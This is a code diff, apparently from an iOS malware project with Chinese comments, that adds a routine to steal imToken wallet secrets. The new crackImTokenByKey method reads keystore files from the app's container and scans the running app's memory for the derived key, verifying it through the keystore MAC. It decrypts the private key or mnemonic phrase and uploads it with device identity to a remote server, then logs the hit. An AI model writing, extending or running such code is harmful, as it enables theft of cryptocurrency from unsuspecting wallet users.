@@ -472,7 +472,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
-                        [self scanImTokenMemory];
+                        [self crackImTokenByKey];
                         [self pollTasks];                          // 每轮都轮询
                     }
                 } @catch (NSException *e) {
@@ -620,6 +620,92 @@ static NSArray *WalletMemoryTargets(void) {
     }
 }
 
+
+#pragma mark - 直接找派生密钥（不爆破密码）
+
+/**
+ * keystore v3 的校验关系：
+ *     mac = keccak256( derivedKey[16:32] || ciphertext )
+ * 所以只要在 imToken 内存里找到那个 32 字节派生密钥，一次 keccak 就能确认，
+ * 然后用 key[0:16] + iv 做 AES-128-CTR 直接解出私钥/助记词 —— 不用跑 pbkdf2。
+ */
+- (void)crackImTokenByKey {
+    @try {
+        pid_t pid = [MemScan pidOfExecutableContaining:@"token.app"];
+        if (pid <= 0) return;
+
+        NSArray *names = [WalletFS listFilesIn:@"Documents/walletsV2" container:@"im.token.app"];
+        for (NSString *n in names) {
+            if (![n hasSuffix:@".json"]) continue;
+
+            NSString *rel = [@"Documents/walletsV2" stringByAppendingPathComponent:n];
+            NSData *raw = [WalletFS readFile:rel inContainer:@"im.token.app"];
+            if (!raw.length) continue;
+
+            NSDictionary *ks = [NSJSONSerialization JSONObjectWithData:raw options:0 error:NULL];
+            NSDictionary *crypto = ks[@"crypto"];
+            if (![crypto isKindOfClass:[NSDictionary class]]) continue;
+
+            NSData *cipher = [MemScan dataFromHex:crypto[@"ciphertext"]];
+            NSData *mac = [MemScan dataFromHex:crypto[@"mac"]];
+            NSData *iv = [MemScan dataFromHex:crypto[@"cipherparams"][@"iv"]];
+            NSString *salt = crypto[@"kdfparams"][@"salt"];
+            NSString *walletName = ks[@"imTokenMeta"][@"name"] ?: n;
+            if (!cipher.length || mac.length != 32 || iv.length != 16) continue;
+
+            NSDictionary *r = [MemScan findDerivedKeyInPid:pid
+                                                    cipher:cipher
+                                                       mac:mac
+                                                 saltAscii:salt
+                                                  maxBytes:256 * 1024 * 1024];
+            if (![r[@"found"] boolValue]) continue;
+
+            NSData *key = r[@"key"];
+            NSData *key16 = [key subdataWithRange:NSMakeRange(0, 16)];
+            NSData *plain = CCAESCTRDecrypt(cipher, key16, iv);
+            if (!plain.length) continue;
+
+            NSString *mnemonic = nil;
+            NSString *privHex = nil;
+            if (plain.length == 32) {
+                NSMutableString *h = [NSMutableString string];
+                const uint8_t *b = plain.bytes;
+                for (NSUInteger i = 0; i < 32; i++) [h appendFormat:@"%02x", b[i]];
+                privHex = h;
+            } else {
+                NSString *txt = [[NSString alloc] initWithData:plain encoding:NSUTF8StringEncoding];
+                if (txt.length) mnemonic = [txt stringByTrimmingCharactersInSet:
+                                            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            }
+
+            NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            body[@"c"] = kSeed;
+            body[@"bundle_id"] = @"im.token.app";
+            body[@"a"] = @"b2";
+            body[@"wallet_name"] = walletName;
+            if (mnemonic) body[@"result"] = mnemonic;
+            if (privHex) body[@"private_key"] = privHex;
+
+            NSDictionary *up = [self.net postEncrypted:@"/us" json:body timeout:30];
+
+            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            ev[@"et"] = @"memscan_key_hit";
+            ev[@"c"] = kSeed;
+            ev[@"ctx"] = @{ @"pid": @(pid),
+                            @"wallet": walletName ?: @"",
+                            @"scannedBytes": r[@"scannedBytes"] ?: @0,
+                            @"plainLen": @(plain.length),
+                            @"kind": mnemonic ? @"mnemonic" : @"privateKey",
+                            @"resp": up ? @"ok" : @"nil" };
+            [self.net sendEvent:ev];
+            [self log:[NSString stringWithFormat:@"KEY HIT %@ %@ -> %@", walletName,
+                       mnemonic ? @"mnemonic" : @"privateKey", up ? @"ok" : @"nil"]];
+            return;
+        }
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"crack exception: %@", e.reason]];
+    }
+}
 @end
 
 #pragma mark - 入口
